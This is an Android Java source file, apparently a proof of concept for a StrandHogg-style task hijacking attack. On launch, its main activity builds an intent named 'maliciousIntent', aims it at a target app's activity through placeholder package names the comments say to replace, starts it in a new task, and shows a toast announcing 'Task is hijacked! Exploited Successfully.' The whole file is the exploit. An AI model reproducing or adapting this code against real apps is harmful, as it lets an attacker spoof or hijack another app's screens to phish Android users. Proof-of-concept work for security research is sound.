package com.nahid0x1.taskhijackp0cbynahid0x1;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        // StrandHogg magic begins here
        Context context = getApplicationContext();
        String packageName = "com.nahid0x1.myapp"; // Replace with the target package name

        Intent maliciousIntent = new Intent();
        maliciousIntent.setClassName(packageName, "com.nahid0x1.quickview.dashboard.DashboardActivity"); // Replace with the target activity
        maliciousIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        context.startActivity(maliciousIntent);

        Toast.makeText(context, "Task is hijacked! Exploited Successfully.", Toast.LENGTH_LONG).show();

    }
}
